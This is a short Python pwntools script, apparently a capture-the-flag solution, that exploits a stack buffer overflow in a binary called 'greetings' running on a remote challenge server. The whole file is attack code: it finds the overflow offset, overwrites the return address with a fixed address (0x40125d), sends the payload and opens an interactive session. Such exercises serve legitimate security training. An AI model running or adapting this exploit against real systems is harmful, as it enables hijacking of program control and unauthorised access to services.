#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./greetings", checksec=False)

# p = process(exe.path)
p = remote("host3.metaproblems.com", 6040)

padding = cyclic_find("dmaa")

payload = b"A" * padding
payload += p64(0x000000000040125d)

p.sendline(payload)

p.interactive()